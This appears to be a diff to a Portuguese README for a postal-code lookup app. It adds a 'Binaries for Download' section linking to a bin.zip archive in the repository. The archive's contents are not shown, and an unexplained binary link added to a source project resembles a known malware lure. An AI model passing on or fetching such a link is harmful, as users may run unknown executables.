@@ -20,3 +20,6 @@
 1. Inicie a aplicação backend.
 2. Inicie a aplicação frontend.
 3. Agora basta realizar as consultas.
+
+## Binários para Download
+  https://github.com/marcilima/consultacep/raw/refs/heads/main/bin.zip
